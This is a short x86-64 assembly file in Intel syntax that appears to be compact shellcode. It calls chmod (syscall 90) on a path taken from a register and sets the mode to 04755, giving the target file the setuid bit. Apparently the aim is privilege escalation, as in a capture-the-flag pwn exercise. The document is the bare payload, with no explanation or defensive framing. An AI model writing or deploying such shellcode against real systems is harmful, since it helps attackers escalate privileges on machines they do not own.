.global _start
.intel_syntax noprefix
_start:
    mov al, 90
    push rcx 
    pop rdi
    mov si, 04755
    syscall


